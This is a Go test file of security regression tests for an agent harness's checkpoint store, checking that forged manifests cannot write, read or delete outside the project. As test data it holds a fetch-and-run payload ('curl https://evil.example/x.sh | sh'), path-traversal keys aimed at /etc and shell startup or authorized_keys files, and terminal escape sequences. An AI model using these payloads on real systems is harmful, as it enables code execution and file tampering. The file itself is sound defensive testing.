package checkpoint

// Security regression tests for docs/reviews/security-robustness.md (S37, part of F12):
// a checkpoint manifest is data an attacker may have written, so nothing in it may
// steer Restore or Diff outside the project, and nothing in it may make them read or
// write without bound. TestSecReview_S37* began as a repro that failed while the finding
// was open. TestSecSound_* pin behaviour the review found sound.

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/reee344/sleipnir/internal/core"
	"github.com/reee344/sleipnir/internal/events"
)

// forge is a state directory, a project root and a victim location outside it.
type forge struct {
	t      *testing.T
	base   string
	root   string
	state  string
	victim string // a path outside the project that must never be written
	blobs  *events.MemBlobs
}

func newForge(t *testing.T) *forge {
	t.Helper()
	base := t.TempDir()
	f := &forge{t: t, base: base, root: filepath.Join(base, "project"), state: filepath.Join(base, "project", ".sleipnir", "checkpoints"),
		victim: filepath.Join(base, "home", ".bashrc-or-authorized_keys"), blobs: events.NewMemBlobs()}
	for _, d := range []string{f.root, filepath.Dir(f.victim), f.state} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	return f
}

// blob stores content and returns the hash and checksum fields of a record for it.
func (f *forge) blob(content string) (hash core.Hash, size int) {
	h, err := f.blobs.Put([]byte(content))
	if err != nil {
		f.t.Fatal(err)
	}
	return h, len(content)
}

// manifest writes cp_0001.json with the given JSON records.
func (f *forge) manifest(records ...string) {
	f.t.Helper()
	doc := `{"v":1,"id":"cp_0001","seq":1,"label":"forged","time":"2026-09-30T00:00:00Z","files":[` + strings.Join(records, ",") + `]}`
	if err := os.WriteFile(filepath.Join(f.state, "cp_0001.json"), []byte(doc), 0o600); err != nil {
		f.t.Fatal(err)
	}
}

// fileRecord is a record that restores content to path.
func (f *forge) fileRecord(path, content string, extra string) string {
	h, size := f.blob(content)
	p, _ := json.Marshal(path) // %q is not JSON: it writes \x00 for a NUL
	return fmt.Sprintf(`{"path":%s,"pre":{"kind":"file","blob":%q,"sum":%q,"size":%d,"mode":420},"at":"2026-09-30T00:00:00Z","last":"2026-09-30T00:00:00Z","post":{"kind":"absent"}%s}`,
		p, h, h, size, extra)
}

func (f *forge) open() *Store {
	f.t.Helper()
	s, err := New(f.state, f.blobs, f.root)
	if err != nil {
		f.t.Fatal(err)
	}
	return s
}

func (f *forge) mustNotExist(path string) {
	f.t.Helper()
	if got, err := os.ReadFile(path); err == nil {
		f.t.Errorf("%s exists outside the project with content %q", path, got)
	}
}

// S37: checkpoint manifests are trusted input. validRecord accepted ABSOLUTE paths, the content
// checksum was optional, and nothing authenticated a manifest or its blobs. If the state
// directory lives under the project (.sleipnir/ is ignored by this repo's .gitignore but is not
// protected from the agent's write tools, and a hostile repository can ship its own), Restore
// ("rewind") wrote attacker content to attacker-chosen absolute paths with the harness's privileges.
func TestSecReview_S37_ForgedManifestRestoreWritesOutsideTheProject(t *testing.T) {
	f := newForge(t)
	payload := "curl https://evil.example/x.sh | sh\n"
	h, _ := f.blob(payload)
	// Exactly the shape of the original repro: absolute path, no "sum".
	f.manifest(fmt.Sprintf(`{"path":%q,"pre":{"kind":"file","blob":%q,"mode":420},"at":"2026-09-30T00:00:00Z","last":"2026-09-30T00:00:00Z","post":{"kind":"absent"}}`, f.victim, h))
	s := f.open()
	rep, err := s.Restore("cp_0001", RestoreOpts{})
	t.Logf("restore: %s (err=%v)", rep.Summary(), err)
	f.mustNotExist(f.victim)
	if len(s.Warnings()) == 0 {
		t.Error("the dropped record should have been reported")
	}
}

// Every way a forged key can point out of the project is refused at load, with the same
// result: nothing written, nothing read, a warning naming the record.
func TestSecReview_S37_EveryEscapingKeyIsDropped(t *testing.T) {
	f := newForge(t)
	rel, err := filepath.Rel(f.root, f.victim)
	if err != nil {
		t.Fatal(err)
	}
	keys := []string{
		f.victim, filepath.ToSlash(f.victim), "/etc/cron.d/evil", rel, filepath.ToSlash(rel), "../" + filepath.Base(f.base) + "/home/x",
		"a/../../escape", "a/../../../etc/passwd", "..", ".", "", "sub/..", "x\x00y", strings.Repeat("a/", 3000) + "z",
	}
	var records []string
	for _, k := range keys {
		records = append(records, f.fileRecord(k, "ATTACKER", ""))
	}
	f.manifest(records...)
	s := f.open()
	if got := s.List(); len(got) != 1 || len(got[0].Files) != 0 {
		t.Fatalf("every escaping record must be dropped, List = %+v", got)
	}
	if n := len(s.Warnings()); n != len(keys) {
		t.Errorf("%d warnings for %d dropped records: %v", n, len(keys), s.Warnings())
	}
	rep := mustRestore(t, s, "cp_0001", RestoreOpts{Force: true})
	if len(rep.Files) != 0 {
		t.Fatalf("nothing to rewind, got %+v", rep.Files)
	}
	f.mustNotExist(f.victim)
	if _, err := os.Stat(filepath.Join(f.base, "escape")); err == nil {
		t.Error("a path escaped through ..")
	}
}

// A saved file without both hashes cannot be rewound: the checksum is what stands between a
// forged blob reference and a write, so a record without one is dropped, not trusted.
func TestSecReview_S37_ARecordNeedsHashesAndSaneFields(t *testing.T) {
	f := newForge(t)
	h, size := f.blob("content")
	rec := func(pre string) string {
		return fmt.Sprintf(`{"path":"a.txt","pre":%s,"at":"2026-09-30T00:00:00Z","last":"2026-09-30T00:00:00Z"}`, pre)
	}
	bad := map[string]string{
		"no sum":            fmt.Sprintf(`{"kind":"file","blob":%q,"size":%d,"mode":420}`, h, size),
		"no blob":           fmt.Sprintf(`{"kind":"file","sum":%q,"size":%d,"mode":420}`, h, size),
		"traversing blob":   fmt.Sprintf(`{"kind":"file","blob":"../../etc/passwd","sum":%q,"size":%d}`, h, size),
		"short hash":        fmt.Sprintf(`{"kind":"file","blob":"abc","sum":"abc","size":%d}`, size),
		"uppercase hash":    fmt.Sprintf(`{"kind":"file","blob":%q,"sum":%q,"size":%d}`, strings.ToUpper(string(h)), h, size),
		"negative size":     fmt.Sprintf(`{"kind":"file","blob":%q,"sum":%q,"size":-1}`, h, h),
		"huge size":         fmt.Sprintf(`{"kind":"file","blob":%q,"sum":%q,"size":%d}`, h, h, int64(1)<<50),
		"unknown kind":      `{"kind":"rootkit"}`,
		"empty kind":        `{}`,
		"mode out of range": fmt.Sprintf(`{"kind":"file","blob":%q,"sum":%q,"size":%d,"mode":4294967295}`, h, h, size),
		"symlink no target": `{"kind":"symlink"}`,
		"symlink NUL":       `{"kind":"symlink","target":"a\u0000b"}`,
	}
	var records []string
	names := make([]string, 0, len(bad))
	for name, pre := range bad {
		names = append(names, name)
		records = append(records, strings.Replace(rec(pre), `"a.txt"`, fmt.Sprintf("%q", strings.ReplaceAll(name, " ", "-")+".txt"), 1))
	}
	f.manifest(records...)
	s := f.open()
	if got := s.List()[0].Files; len(got) != 0 {
		t.Fatalf("records that should have been dropped survived: %v (of %v)", got, names)
	}
	// An owner out of range is not a reason to drop the record; it is just not applied.
	f.manifest(fmt.Sprintf(`{"path":"ok.txt","pre":{"kind":"file","blob":%q,"sum":%q,"size":%d,"mode":420,"owner":{"uid":-5,"gid":9999999999}}}`, h, h, size))
	s = f.open()
	if got := s.List()[0].Files; len(got) != 1 {
		t.Fatalf("a bad owner should be ignored, not fatal: %v %v", got, s.Warnings())
	}
	s.mu.Lock()
	owner := s.cps[0].index["ok.txt"].Pre.Owner
	s.mu.Unlock()
	if owner != nil {
		t.Fatalf("the out-of-range owner was kept: %+v", owner)
	}
}

// A rewind is not a way around symlinks: a manifest that first plants a link out of the
// project and then "restores" a file beneath it must not write through it. The path is
// resolved again at the moment of writing, so what an earlier step of the same rewind
// created is seen.
func TestSecReview_S37_ASymlinkPlantedByTheRewindItselfIsNotFollowed(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks")
	}
	f := newForge(t)
	outside := filepath.Join(f.base, "home")
	f.manifest(
		fmt.Sprintf(`{"path":"trap","pre":{"kind":"symlink","target":%q},"at":"2026-09-30T00:00:00Z","last":"2026-09-30T00:00:00Z"}`, outside),
		f.fileRecord("trap/.bashrc-or-authorized_keys", "ATTACKER\n", ""),
	)
	s := f.open()
	rep, err := s.Restore("cp_0001", RestoreOpts{Force: true})
	if err != nil {
		t.Fatal(err)
	}
	f.mustNotExist(f.victim)
	if r := result(t, rep, "trap/.bashrc-or-authorized_keys"); r.Outcome == OutcomeDone {
		t.Fatalf("the write through the planted link was reported as done: %+v", r)
	}
	if entries, _ := os.ReadDir(outside); len(entries) != 0 {
		names := []string{}
		for _, e := range entries {
			names = append(names, e.Name())
		}
		t.Fatalf("the directory behind the link was written to: %v", names)
	}
}

// A symlink that appears where a directory was, after the checkpoint, is not followed either:
// the rewind (and Diff) refuse the path instead of reaching through the link.
func TestSecReview_S37_ADirectoryReplacedByASymlinkAfterTheCheckpointIsRefused(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks")
	}
	e := newEnv(t)
	outside := filepath.Join(e.base, "outside")
	if err := os.MkdirAll(outside, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(outside, "a.md"), []byte("PRECIOUS OUTSIDE\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	e.write("docs/a.md", "orig\n")
	cp := e.s.Begin("p")
	e.edit("a1", "docs/a.md", "edited\n")
	// The agent (or anything else) swaps the directory for a link out of the project.
	if err := os.Rename(e.abs("docs"), e.abs("docs.moved")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, e.abs("docs")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	rep := mustRestore(t, e.s, cp, RestoreOpts{Force: true})
	if r := result(t, rep, "docs/a.md"); r.Outcome != OutcomeUnrestorable || !strings.Contains(r.Detail, "outside the project root") {
		t.Fatalf("docs/a.md = %+v", r)
	}
	if b, _ := os.ReadFile(filepath.Join(outside, "a.md")); string(b) != "PRECIOUS OUTSIDE\n" {
		t.Fatalf("the file behind the link was written: %q", b)
	}
	diffs, err := e.s.Diff(cp)
	if err != nil || len(diffs) != 1 || !strings.Contains(diffs[0].Note, "cannot be compared") || diffs[0].Unified != "" {
		t.Fatalf("Diff must not read through the link: %+v %v", diffs, err)
	}
	if strings.Contains(fmt.Sprint(diffs), "PRECIOUS") {
		t.Fatalf("Diff leaked the content behind the link: %+v", diffs)
	}
}

// Directory names a manifest says a tool created are removed when empty; a forged one must not be
// a way to rmdir somewhere else.
func TestSecReview_S37_ForgedNewDirsCannotRemoveDirectoriesElsewhere(t *testing.T) {
	f := newForge(t)
	victimDir := filepath.Join(f.base, "home", "empty-dir-that-must-stay")
	if err := os.MkdirAll(victimDir, 0o755); err != nil {
		t.Fatal(err)
	}
	relVictim, _ := filepath.Rel(f.root, victimDir)
	if err := os.WriteFile(filepath.Join(f.root, "created.txt"), []byte("made by a tool\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(f.root, "inside-empty"), 0o755); err != nil {
		t.Fatal(err)
	}
	f.manifest(fmt.Sprintf(`{"path":"created.txt","pre":{"kind":"absent"},"at":"2026-09-30T00:00:00Z","last":"2026-09-30T00:00:00Z","new_dirs":[%q,%q,"inside-empty","/","..","a\u0000b"]}`,
		victimDir, filepath.ToSlash(relVictim)))
	s := f.open()
	rep := mustRestore(t, s, "cp_0001", RestoreOpts{Force: true}) // the forged "last write" time predates the file
	if !rep.OK() {
		t.Fatalf("%s %+v", rep.Summary(), rep.Files)
	}
	if _, err := os.Stat(victimDir); err != nil {
		t.Fatalf("a directory outside the project was removed by a forged new_dirs entry: %v", err)
	}
	if _, err := os.Stat(filepath.Join(f.root, "created.txt")); err == nil {
		t.Fatal("the created file should have been removed")
	}
	if _, err := os.Stat(filepath.Join(f.root, "inside-empty")); err == nil {
		t.Fatal("a legitimate created directory (inside the root, empty) should have been removed")
	}
}

// Content is bounded on the way back: a record cannot make Restore read a blob over the store's cap
// into memory (whatever size it claims), and one rewind writes at most maxRestoreBytes.
func TestSecReview_S37_RestoreOfHugeContentIsBounded(t *testing.T) {
	f := newForge(t)
	s := f.open()
	s.maxBytes = 1024
	big := strings.Repeat("B", 4096)
	h, _ := f.blob(big)
	// The record lies about the size: the blob is 4096 bytes, the cap 1024.
	s.mu.Lock()
	cp := s.beginLocked("p")
	cp.add(&fileRec{Path: "big.txt", Pre: state{Kind: kFile, Blob: h, Sum: h, Size: 10, Mode: 0o644}})
	s.mu.Unlock()
	rep := mustRestore(t, s, cp.ID, RestoreOpts{})
	if r := result(t, rep, "big.txt"); r.Outcome != OutcomeFailed || !strings.Contains(r.Detail, "larger than") {
		t.Fatalf("big.txt = %+v", r)
	}
	if _, err := os.Stat(filepath.Join(f.root, "big.txt")); err == nil {
		t.Fatal("an oversized blob was written")
	}

	// The whole rewind is budgeted too.
	old := maxRestoreBytes
	maxRestoreBytes = 100
	t.Cleanup(func() { maxRestoreBytes = old })
	s = f.open()
	s.mu.Lock()
	cp = s.beginLocked("q")
	for _, name := range []string{"a.txt", "b.txt", "c.txt"} {
		h, size := f.blob(strings.Repeat(name[:1], 60))
		cp.add(&fileRec{Path: name, Pre: state{Kind: kFile, Blob: h, Sum: h, Size: int64(size), Mode: 0o644}})
	}
	s.mu.Unlock()
	rep = mustRestore(t, s, cp.ID, RestoreOpts{})
	if done, failed := rep.Count(OutcomeDone), rep.Count(OutcomeFailed); done != 1 || failed != 2 {
		t.Fatalf("a 100-byte budget should let one 60-byte file through: %d done, %d failed: %+v", done, failed, rep.Files)
	}
	for _, r := range rep.Files {
		if r.Outcome == OutcomeFailed && !strings.Contains(r.Detail, "limit") {
			t.Fatalf("%+v", r)
		}
	}
}

// A blob whose content does not match the record's checksum is refused, and so is one the store itself
// flags as damaged. The file stays as it was.
func TestSecReview_S37_TamperedOrMismatchedBlobsAreNotWritten(t *testing.T) {
	base := t.TempDir()
	root := filepath.Join(base, "project")
	if err := os.MkdirAll(root, 0o755); err != nil {
		t.Fatal(err)
	}
	blobs, err := events.NewDirBlobs(filepath.Join(base, "state", "blobs"))
	if err != nil {
		t.Fatal(err)
	}
	s, err := New(filepath.Join(base, "state"), blobs, root)
	if err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(root, "a.txt")
	if err := os.WriteFile(target, []byte("original\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cp := s.Begin("p")
	if err := s.Before("a1", target); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(target, []byte("edited by the agent\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	// Someone rewrites the saved copy in the blob store to plant content.
	s.mu.Lock()
	h := s.cps[0].index["a.txt"].Pre.Blob
	s.mu.Unlock()
	if err := os.WriteFile(filepath.Join(base, "state", "blobs", string(h[:2]), string(h[2:4]), string(h)), []byte("curl evil | sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	rep := mustRestore(t, s, cp, RestoreOpts{Force: true})
	if r := result(t, rep, "a.txt"); r.Outcome != OutcomeFailed || !strings.Contains(r.Detail, "corrupt") {
		t.Fatalf("a.txt = %+v", r)
	}
	if b, _ := os.ReadFile(target); string(b) != "edited by the agent\n" {
		t.Fatalf("the file was overwritten with tampered content: %q", b)
	}
}

// The manifest files themselves are read with bounds: a huge one, a symlink and a FIFO are skipped with a
// warning (and keep their number), never read whole or waited on.
func TestSecReview_S37_ManifestFilesAreReadWithBounds(t *testing.T) {
	f := newForge(t)
	old := maxManifestBytes
	maxManifestBytes = 2048
	t.Cleanup(func() { maxManifestBytes = old })
	pad := strings.Repeat(" ", 4096)
	if err := os.WriteFile(filepath.Join(f.state, "cp_0001.json"), []byte(`{"v":1,"id":"cp_0001","seq":1,"files":[]}`+pad), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(f.base, "real.json"), []byte(`{"v":1,"id":"cp_0002","seq":2,"files":[]}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(f.base, "real.json"), filepath.Join(f.state, "cp_0002.json")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	s := f.open()
	if got := s.List(); len(got) != 0 {
		t.Fatalf("neither file should have loaded: %+v", got)
	}
	if n := len(s.Warnings()); n != 2 {
		t.Fatalf("warnings = %v", s.Warnings())
	}
	if id := s.Begin("next"); id != "cp_0003" {
		t.Fatalf("skipped files keep their numbers: id = %s", id)
	}
}

// A hostile file name or counter cannot overflow the id counter.
func TestSecReview_S37_HugeCheckpointNumbersCannotOverflowTheCounter(t *testing.T) {
	f := newForge(t)
	for _, name := range []string{"cp_9223372036854775807.json", "cp_99999999999999999999999.json", "cp_2147483648.json"} {
		if err := os.WriteFile(filepath.Join(f.state, name), []byte(`{}`), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(f.state, "meta.json"), []byte(`{"v":1,"next":9223372036854775807}`), 0o600); err != nil {
		t.Fatal(err)
	}
	s := f.open()
	if id := s.Begin("x"); id != "cp_0001" {
		t.Fatalf("id = %s: out-of-range numbers must be ignored, not adopted", id)
	}
	if n := len(s.Warnings()); n != 3 {
		t.Fatalf("warnings = %v", s.Warnings())
	}
}

// Text that ends up in listings and reports is cleaned: a forged label cannot carry escape sequences or
// line breaks, and the number of warnings is bounded however much damage there is.
func TestSecReview_S37_ManifestTextIsCleanedAndWarningsAreBounded(t *testing.T) {
	f := newForge(t)
	var records []string
	for i := 0; i < 500; i++ {
		records = append(records, fmt.Sprintf(`{"path":"../x%d","pre":{"kind":"absent"}}`, i))
	}
	records = append(records, `{"path":"ok.txt","pre":{"kind":"absent"},"agents":["a\u001b[31mred","b\nc"]}`)
	doc := `{"v":1,"id":"cp_0001","seq":1,"label":"before\u001b]0;evil\u0007 after\nnew line","time":"2026-09-30T00:00:00Z","files":[` + strings.Join(records, ",") + `]}`
	if err := os.WriteFile(filepath.Join(f.state, "cp_0001.json"), []byte(doc), 0o600); err != nil {
		t.Fatal(err)
	}
	s := f.open()
	info := s.List()[0]
	if strings.ContainsAny(info.Label, "\x1b\x07\n") {
		t.Fatalf("label = %q", info.Label)
	}
	for _, a := range info.Agents {
		if strings.ContainsAny(a, "\x1b\n") {
			t.Fatalf("agent = %q", a)
		}
	}
	if n := len(s.Warnings()); n > maxWarnings+1 {
		t.Fatalf("%d warnings", n)
	}
	last := s.Warnings()[len(s.Warnings())-1]
	if !strings.Contains(last, "more problems") {
		t.Fatalf("the cut should say so: %q", last)
	}
}

// State is private to the user: the directory, manifests and counter are 0700/0600, and a directory left
// wider by an older version is tightened.
func TestSecReview_S37_StateIsPrivate(t *testing.T) {
	if runtime.GOOS == "windows" || runtime.GOOS == "plan9" {
		t.Skip("permission bits are not meaningful here")
	}
	base := t.TempDir()
	root := filepath.Join(base, "project")
	if err := os.MkdirAll(root, 0o755); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(base, "state", "checkpoints")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	s, err := New(dir, nil, root) // its own blob store
	if err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(root, "a.txt")
	if err := os.WriteFile(target, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	s.Begin("p")
	if err := s.Before("a1", target); err != nil {
		t.Fatal(err)
	}
	seen := 0
	err = filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		fi, err := d.Info()
		if err != nil {
			return err
		}
		seen++
		if fi.Mode().Perm()&0o077 != 0 {
			t.Errorf("%s is %v: readable by other local users", p, fi.Mode().Perm())
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if seen < 6 { // dir, cp_0001.json, meta.json, blobs, ab, cd, blob
		t.Fatalf("walked only %d entries", seen)
	}
}

// Files outside the project are recorded by absolute path and can be rewound by the process that
// recorded them (the design), but such a record is not accepted back from disk.
func TestSecReview_S37_OutsideRecordsAreRewindableOnlyByTheRecordingProcess(t *testing.T) {
	e := newEnv(t)
	outside := filepath.Join(e.base, "elsewhere")
	if err := os.MkdirAll(outside, 0o755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(outside, "f.txt")
	if err := os.WriteFile(target, []byte("outside-orig"), 0o644); err != nil {
		t.Fatal(err)
	}
	e.write("inside.txt", "inside-orig")
	cp := e.s.Begin("p")
	e.edit("a1", target, "outside-new")
	e.edit("a1", "inside.txt", "inside-new")
	if got := len(e.s.List()[0].Files); got != 2 {
		t.Fatalf("both files are recorded while the process lives: %v", e.s.List()[0].Files)
	}

	s2 := e.reopen() // a restarted process
	if got := s2.List()[0].Files; len(got) != 1 || got[0] != "inside.txt" {
		t.Fatalf("after a restart only the project's own file is rewindable: %v", got)
	}
	if len(s2.Warnings()) != 1 || !strings.Contains(s2.Warnings()[0], "outside the project root") {
		t.Fatalf("the dropped record should be explained: %v", s2.Warnings())
	}
	mustRestore(t, s2, cp, RestoreOpts{})
	if e.read("inside.txt") != "inside-orig" {
		t.Fatal("the inside file should still be rewound after a restart")
	}
	if b, _ := os.ReadFile(target); string(b) != "outside-new" {
		t.Fatalf("the outside file must be left alone by a rewind that only read it from disk: %q", b)
	}
}

// ---- sound behaviour ----------------------------------------------------------------

// Records made by a live process are still restored exactly, symlinked project roots included, and a
// legitimate directory-symlink inside the project keeps working.
func TestSecSound_LegitimateRewindsAreUnaffected(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks")
	}
	e := newEnv(t)
	e.write("real/a.txt", "orig-a")
	if err := os.Symlink("real", e.abs("alias")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	cp := e.s.Begin("p")
	e.edit("a1", "alias/a.txt", "edited-a") // through a link that stays inside the project
	e.edit("a1", "new/dir/b.txt", "created")
	rep := mustRestore(t, e.s, cp, RestoreOpts{})
	if !rep.OK() {
		t.Fatalf("%s %+v", rep.Summary(), rep.Files)
	}
	if e.read("real/a.txt") != "orig-a" || e.exists("new") {
		t.Fatal("rewind did not restore")
	}
}
